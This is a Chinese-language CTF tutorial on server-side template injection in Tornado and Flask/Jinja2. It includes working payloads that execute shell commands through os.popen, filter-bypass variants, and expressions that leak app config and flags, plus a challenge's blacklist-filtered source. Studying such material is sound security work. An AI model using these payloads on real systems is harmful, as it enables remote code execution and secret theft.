### SSTI 服务端模板注入

一般在题目中遇到python语言就是SSTI的题



### Tornado框架下

#### tornado render模板注入

​	tornado render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页，如果用户对render内容可控，不仅可以注入XSS代码，而且还可以通过{{}}进行传递变量和执行简单的表达式

```
error?msg={{handler.settings}}
```

#### secret_cookie

tornado框架下：**secret_cookie在Application对象settings的属性中**

**self.application.settings=RequestHandler.settings=handler.settings**

### Flask框架

#### flask基础

``` python
from flask import flask 
@app.route('/index/')#route装饰器的作用是将函数与url绑定起来
def hello_word():
    return 'hello word'
```

**render_template_string则是用来渲染一个字符串的。SSTI与这个方法密不可分。**

```python
html = '<h1>This is index page</h1>'
return render_template_string(html)
```

**flask是使用Jinja2来作为渲染引擎的**。看例子

在网站的根目录下新建`templates`文件夹，这里是用来存放html文件。也就是模板文件。

test.py

```python
from flask import Flask,url_for,redirect,render_template,render_template_string
@app.route('/index/')
def user_login():
     return render_template('index.html',content='This is index page.')
```

/templates/index.html

```html
<h1>{{content}}</h1>
```

#### 注入的产生

**在Jinja2模板引擎中，`{{}}`是变量包裹标识符。`{{}}`并不仅仅可以传递变量，还可以执行一些简单的表达式。**

有如下代码：

```python
@app.route('/test/')
def test():
    code = request.args.get('id')
    html = '''
        <h3>%s</h3>
    '''%(code)
    return render_template_string(html)
```

这里code就会接到html里面被jinja2渲染，如果用户提交恶意代码就会被执行

#### 注入利用

[各种注入姿势](https://zhuanlan.zhihu.com/p/93746437)

一般的思路是：通过一些提供的魔术方法，然后经过对象的继承原理来实现命令执行和文件读取

下面有一些主要的魔术方法

```python
__class__  返回类型所属的对象
__mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。
__base__   返回该对象所继承的基类
// __base__和__mro__都是用来寻找基类的

__subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表
__init__  类的初始化方法
__globals__  对包含函数全局变量的字典的引用
```



**进行命令的执行的模块：os**

**可以进行命令执行的的函数：os.system()，os.popen()**

**前者返回值是脚本的退出状态码，后者的返回值是脚本执行过程中的输出内容**

一些命令执行构造：

```jinja2
{{''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].popen('ls').read()}}
#包含特殊字符的绕过方式
︷︷config.__class__.__init__.__globals__[＇os＇].popen(＇cat /flag＇).read()︸︸
#大小写绕过
{{""["__CLASS__".lower()]["__MRO__".lower()][2]["__SUBCLASSES__".lower()]()[71]["__INIT__".lower()]["__GLOBALS__".lower()]['os']["POPEN".lower()]["('CAT /opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt')".lower()]}}
#使用request.args绕过
{{''[request.args.a][request.args.b][2][request.args.c]()[40]('/opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt')[request.args.d]()}}?a=__class__&b=__mro__&c=__subclasses__&d=read
```

**获取当前配置信息**：

```jinja2
{{config}}
{{self.__dict__._TemplateReference__context.config}}
#如果上面提到的 config、self 不能使用，要获取配置信息，就必须从它的全局变量（访问配置 current_app 等）
{{url_for.__globals__['current_app'].config.FLAG}}
{{get_flashed_messages.__globals__['current_app'].config.FLAG}}
{{request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__globals__['current_app'].config['FLAG']}}
```

### 题目

#### shrine

进入环境后直接就是一段python写的后端代码，为flask框架，可以直接先考虑SSTI

```python
import flask
import os

app = flask.Flask(__name__)

app.config['FLAG'] = os.environ.pop('FLAG')


@app.route('/')
def index():
    return open(__file__).read()

@app.route('/shrine/<path:shrine>')
def shrine(shrine):

    def safe_jinja(s):
        s = s.replace('(', '').replace(')', '')
        blacklist = ['config', 'self']
        return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) + s

    return flask.render_template_string(safe_jinja(shrine))

if __name__ == '__main__':
    app.run(debug=True)
```

可以看到在safe_jinja函数中，对小括号进行了过滤，说明不能调用`__subclasses__[]()`函数进行操作，对config,self进行了过滤
